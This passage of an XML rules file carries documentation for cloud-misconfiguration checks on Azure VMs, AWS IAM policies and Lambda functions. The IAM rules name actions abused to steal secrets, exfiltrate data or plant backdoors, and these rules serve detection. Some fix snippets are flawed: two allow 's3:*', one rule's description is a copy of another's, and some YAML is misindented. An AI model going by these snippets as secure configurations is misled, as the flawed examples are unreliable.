<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>Resource: azurerm_linux_virtual_machine_scale_set<br/>
Attribute: disable_password_authentication</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">azurerm_linux_virtual_machine_scale_set.example.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="azurerm_linux_virtual_machine_scale_set.example.tf">resource "azurerm_linux_virtual_machine_scale_set" "example" {
            ...
          ~ disable_password_authentication = true
        }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_general_13' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_general_13</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_general_13' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_50</key>
    <name>Ensure Virtual Machine extensions are not installed</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="virtual-machine-extensions-are-installed"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-virtual-machine-extensions-are-installed"></div>Virtual Machine extensions are installed</div><a aria-label="Skip link to Virtual Machine extensions are installed" class="heading-anchor-icon fa fa-anchor" href="#virtual-machine-extensions-are-installed"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Ensure that your Microsoft Azure virtual machines (VMs) does not have extensions installed in order to follow your organization's security and compliance requirements. Azure virtual machine extensions are small cloud applications that provide post-deployment configuration and automation tasks for virtual machines. These extensions run with administrative privileges and could potentially access any configuration file or piece of data on a virtual machine. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_virtual_machine, azurerm_linux_virtual_machine</li>
<li><strong>Argument:</strong> allow_extension_operations</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">azurerm_linux_virtual_machine.example.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="azurerm_linux_virtual_machine.example.tf">resource "azurerm_linux_virtual_machine" "example" {
    ...
 ~  allow_extension_operations=false
  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_general_14' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_general_14</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_general_14' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_107</key>
    <name>Ensure IAM policies do not allow credentials exposure for ECR</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="credentials-exposure-actions-return-credentials-in-an-api-response"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-credentials-exposure-actions-return-credentials-in-an-api-response"></div>Credentials exposure actions return credentials in an API response</div><a aria-label="Skip link to Credentials exposure actions return credentials in an API response" class="heading-anchor-icon fa fa-anchor" href="#credentials-exposure-actions-return-credentials-in-an-api-response"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS IAM users access AWS resources using different types of credentials, such as passwords or access keys. Credentials Exposure actions return credentials as part of the API response, such as ecr:GetAuthorizationToken, iam:UpdateAccessKey, and others.</p>
<p>For more info, visit cloudsplaning documentation<br/>
<a href="https://cloudsplaining.readthedocs.io/en/latest/glossary/credentials-exposure/" target="_self">https://cloudsplaining.readthedocs.io/en/latest/glossary/credentials-exposure/</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_iam_policy_document</li>
<li><strong>Argument:</strong> effect + actions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">data "aws_iam_policy_document" "example" {
  statement {
    sid = "1"
    effect = "Allow"
    actions = [
      "lambda:CreateFunction",
      "lambda:CreateEventSourceMapping",
      "dynamodb:CreateTable",
    ]
    resources = [
      "*",
    ]
  }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::IAM::Policy / AWS::IAM::ManagedPolicy / AWS::IAM::Group /<br/>
AWS::IAM::Role / AWS::IAM::User  </li>
<li><strong>Argument:</strong> Effect + Actions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  AdminDeny:
    Type: 'AWS::IAM::ManagedPolicy'
    Properties:
      ...
      PolicyDocument:
        ...
        Statement:
          - Effect: Allow
            Action: 
            -   'lambda:CreateFunction'
                    -   'lambda:CreateEventSourceMapping'
                -   'dynamodb:CreateTable'
            Resource: '*'
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-credentials-exposure' target='_blank'> https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-credentials-exposure</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-credentials-exposure' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_108</key>
    <name>Ensure IAM policies do not allow data exfiltration</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="data-exfiltration-allowed-without-resource-constraints"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-data-exfiltration-allowed-without-resource-constraints"></div>Data exfiltration allowed without resource constraints</div><a aria-label="Skip link to Data exfiltration allowed without resource constraints" class="heading-anchor-icon fa fa-anchor" href="#data-exfiltration-allowed-without-resource-constraints"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Data Exfiltration actions allow certain read-only IAM actions without resource constraints, such as s3:GetObject, ssm:GetParameter*, or secretsmanager:GetSecretValue.</p>
<p>1 - Unrestricted s3:GetObject permissions has a long history of customer data leaks<br/>
2 - ssm:GetParameter* and secretsmanager:GetSecretValue are both used to access secrets.<br/>
3 - rds:CopyDBSnapshot and rds:CreateDBSnapshot can be used to exfiltrate RDS database contents.</p>
<p>For more info, visit cloudsplaning documentation<br/>
<a href="https://cloudsplaining.readthedocs.io/en/latest/glossary/data-exfiltration/" target="_self">https://cloudsplaining.readthedocs.io/en/latest/glossary/data-exfiltration/</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_iam_policy_document</li>
<li><strong>Argument:</strong> effect + actions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">data "aws_iam_policy_document" "example" {
              statement {
                sid = "1"
                effect = "Allow"
                actions = [
                    "lambda:CreateFunction",
                    "lambda:CreateEventSourceMapping",
                    "dynamodb:CreateTable",
                ]
                resources = [
                  "*",
                ]
              }
            }
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::IAM::ManagedPolicy</li>
<li><strong>Argument:</strong> Effect + Actions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: 'AWS::IAM::ManagedPolicy'
    Properties:
      ...
      PolicyDocument:
        ...
        Statement:
          - Effect: Allow
            Action: 
            -   'lambda:CreateFunction'
            -   'lambda:CreateEventSourceMapping'
            -   'dynamodb:CreateTable'
            Resource: '*'
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-data-exfiltration' target='_blank'> https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-data-exfiltration</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-data-exfiltration' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_109</key>
    <name>Ensure IAM policies do not allow permissions management / resource exposure without constraint</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="resource-exposure-allows-modification-of-policies-and-exposes-resources"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-resource-exposure-allows-modification-of-policies-and-exposes-resources"></div>Resource exposure allows modification of policies and exposes resources</div><a aria-label="Skip link to Resource exposure allows modification of policies and exposes resources" class="heading-anchor-icon fa fa-anchor" href="#resource-exposure-allows-modification-of-policies-and-exposes-resources"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy allows actions that permit modification of resource-based policies or can otherwise can expose AWS resources to the public via similar actions that can lead to resource exposure.</p>
<p>For example:<br/>
1 - s3:PutBucketPolicy, s3:PutBucketAcl, and s3:PutObjectAcl grant permissions to modify the properties of S3 buckets or objects for new or existing objects in an S3 bucket, which could expose objects to rogue actors or to the internet.<br/>
2 - ecr:SetRepositoryPolicy could allow an attacker to exfiltrate container images (which sometimes unintentionally contain secrets and non-public information), tamper with container images, or otherwise modify.<br/>
3 - iam:UpdateAssumeRolePolicy could allow an attacker to create a backdoor by assuming a privileged role in the victim account from an external account.<br/>
The ability to modify AWS Resource Access Manager, which could allow a malicious actor to share a VPC hosting sensitive or internal services to rogue AWS accounts<br/>
Attackers can easily exploit Resource Exposure permissions to expose resources to rogue users or the internet, as shown by endgame, an AWS pentesting tool that was also released by Salesforce.</p>
<p>For more info, visit cloudsplaning documentation<br/>
<a href="https://cloudsplaining.readthedocs.io/en/latest/glossary/resource-exposure/" target="_self">https://cloudsplaining.readthedocs.io/en/latest/glossary/resource-exposure/</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_iam_policy_document</li>
<li><strong>Argument:</strong> effect + actions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">data "aws_iam_policy_document" "example" {
  statement {
    sid = "1"
    effect = "Allow"
    actions = [
      "s3:*"
    ]     
    resources = [
      "foo",
    ]
  }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_iam_policy_document</li>
<li><strong>Argument:</strong> effect + actions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: 'AWS::IAM::ManagedPolicy'
    Properties:
      ...
      PolicyDocument:
        ...
        Statement:
          - Effect: Allow
            Action: 
            - 's3:*'
            Resource: 'foo'
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-permissions-management-resource-exposure-without-constraint' target='_blank'> https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-permissions-management-resource-exposure-without-constraint</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-permissions-management-resource-exposure-without-constraint' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_111</key>
    <name>Ensure IAM policies does not allow write access without constraint</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="write-access-allowed-without-constraint"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-write-access-allowed-without-constraint"></div>Write access allowed without constraint</div><a aria-label="Skip link to Write access allowed without constraint" class="heading-anchor-icon fa fa-anchor" href="#write-access-allowed-without-constraint"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy allows actions that permit modification of resource-based policies or can otherwise can expose AWS resources to the public via similar actions that can lead to resource exposure.</p>
<p>For example:<br/>
1 - s3:PutBucketPolicy, s3:PutBucketAcl, and s3:PutObjectAcl grant permissions to modify the properties of S3 buckets or objects for new or existing objects in an S3 bucket, which could expose objects to rogue actors or to the internet.<br/>
2 - ecr:SetRepositoryPolicy could allow an attacker to exfiltrate container images (which sometimes unintentionally contain secrets and non-public information), tamper with container images, or otherwise modify.<br/>
3 - iam:UpdateAssumeRolePolicy could allow an attacker to create a backdoor by assuming a privileged role in the victim account from an external account.<br/>
The ability to modify AWS Resource Access Manager, which could allow a malicious actor to share a VPC hosting sensitive or internal services to rogue AWS accounts<br/>
Attackers can easily exploit Resource Exposure permissions to expose resources to rogue users or the internet, as shown by endgame, an AWS pentesting tool that was also released by Salesforce.</p>
<p>For more info, visit cloudsplaning documentation<br/>
<a href="https://cloudsplaining.readthedocs.io/en/latest/glossary/resource-exposure/" target="_self">https://cloudsplaining.readthedocs.io/en/latest/glossary/resource-exposure/</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_iam_policy_document</li>
<li>*<em>Argument:</em> effect + actions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">data "aws_iam_policy_document" "example" {
              statement {
                sid = "1"
                effect = "Allow"
                actions = [
                        "s3:*"
                ]
            
                resources = [
                  "foo",
                ]
              }
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-write-access-without-constraint' target='_blank'> https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-write-access-without-constraint</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-iam-policies-do-not-allow-write-access-without-constraint' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_115</key>
    <name>Ensure AWS Lambda function is configured for function-level concurrent execution limit</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-lambda-function-is-not-configured-for-function-level-concurrent-execution-limit"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-lambda-function-is-not-configured-for-function-level-concurrent-execution-limit"></div>AWS Lambda function is not configured for function-level concurrent execution Limit</div><a aria-label="Skip link to AWS Lambda function is not configured for function-level concurrent execution Limit" class="heading-anchor-icon fa fa-anchor" href="#aws-lambda-function-is-not-configured-for-function-level-concurrent-execution-limit"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Adding concurrency to Lambda initializes that number of execution environments for multiple parallel requests at low latency. However, this could spike costs and open the door for abuse. Adding concurrency limits can prevent a rapid spike in usage and costs, while also increasing or lowering the default concurrency limit.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_lambda_function</li>
<li><strong>Argument:</strong> reserved_concurrent_executions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_lambda_function" "example" {
   ...
+  reserved_concurrent_executions = 100
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resources:</strong> AWS::Lambda::Function, AWS::Serverless::Function</li>
<li><strong>Argument:</strong> Properties/ReservedConcurrentExecutions</li>
</ul>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Type: AWS::Lambda::Function
Properties: 
  ...
  ReservedConcurrentExecutions: 100
  ...
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-aws-lambda-function-is-configured-for-function-level-concurrent-execution-limit' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-aws-lambda-function-is-configured-for-function-level-concurrent-execution-limit</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-aws-lambda-function-is-configured-for-function-level-concurrent-execution-limit' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_116</key>
    <name>Ensure AWS Lambda function is configured for a DLQ</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-lambda-function-is-not-configured-for-a-dlq"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-lambda-function-is-not-configured-for-a-dlq"></div>AWS Lambda function is not configured for a DLQ</div><a aria-label="Skip link to AWS Lambda function is not configured for a DLQ" class="heading-anchor-icon fa fa-anchor" href="#aws-lambda-function-is-not-configured-for-a-dlq"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Setting up a DLQ offers the possibility to investigate errors or failed requests to the connected Lambda function.</p>
<p>As an alternative it is possible to configure an on-failure destination target, which forwards a failed event to a DLQ, SNS Topic, Lambda function or EventBridge.</p>
<p>It is always important to understand why your application/function failed and to ensure that no data was dropped or compromised. Lambda functions are often used to process security related data like CloudTrail events and a failed delivery to a dependent system can result in an unnoticed security breach.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_lambda_function</li>
<li><strong>Argument:</strong> dead_letter_config</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_lambda_function" "test_lambda" {
  ...   
+ dead_letter_config {
+   target_arn = "test"
+ }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::Lambda::Function</li>
<li><strong>Argument:</strong> Properties.DeadLetterConfig</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::Lambda::Function
Properties:
  ...
+ DeadLetterConfig:
+   TargetArn: "test"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-aws-lambda-function-is-configured-for-a-dead-letter-queue-dlq' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-aws-lambda-function-is-configured-for-a-dead-letter-queue-dlq</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-aws-lambda-function-is-configured-for-a-dead-letter-queue-dlq' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_117</key>
    <name>Ensure AWS Lambda function is configured inside a VPC</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-lambda-function-is-not-assigned-to-access-within-vpc"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-lambda-function-is-not-assigned-to-access-within-vpc"></div>AWS Lambda Function is not assigned to access within VPC</div><a aria-label="Skip link to AWS Lambda Function is not assigned to access within VPC" class="heading-anchor-icon fa fa-anchor" href="#aws-lambda-function-is-not-assigned-to-access-within-vpc"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>By default, Lambda runs functions in a secure VPC with access to AWS services and the internet. Lambda owns this VPC, which isn't connected to the account's default VPC. Internet access from a private subnet requires Network Address Translation (NAT). </p>
<p>To give your function access to the internet, route outbound traffic to a NAT gateway in a public subnet.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_lambda_function</li>
<li><strong>Argument:</strong> vpc_config.subnet_ids</li>
<li>For network connectivity to AWS resources in a VPC, specify a list of security groups and subnets in the VPC. When you connect a function to a VPC, it can only access resources and the internet through that VPC.<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">subnet_ids</code> - List of subnet IDs associated with the Lambda function.<br/>
Note: If both subnet_ids and security_group_ids are empty then vpc_config is considered to be empty or unset.</li>
</ul>
